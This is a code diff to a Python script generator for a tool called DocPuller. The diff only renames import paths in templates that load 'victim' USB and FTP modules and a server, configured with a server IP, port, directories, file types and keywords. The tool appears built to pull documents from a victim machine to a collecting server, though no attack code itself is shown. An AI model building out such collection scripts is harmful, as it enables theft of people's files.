@@ -10,7 +10,7 @@ class ScriptGen:
 
             self.SCRIPT = f"""
         
-from DocPullerScripts.DocPullerUsb.usb import DocPullerUSB
+from docpuller_scripts.docpuller_usb.victim_usb import DocPullerUSB
 
 def main():
 
@@ -29,7 +29,8 @@ if __name__ == '__main__':
             self.victim_parms = f'"{server_ip}", {server_port}, {direcoties}, {file_type}, {keywords}, {date}'
             self.SCRIPT1 = f"""
 
-from DocPullerScripts.DocPullerFTP.server import Server
+from docpuller_scripts.docpuller_ftp.server_ftp import Server
+
 
 def main():
 
@@ -45,7 +46,7 @@ if __name__ == '__main__':
 
             self.SCRIPT2 = f"""
 
-from DocPullerScripts.DocPullerFTP.victim import Victim
+from docpuller_scripts.docpuller_ftp.victim_ftp import Victim
 
 def main():
 
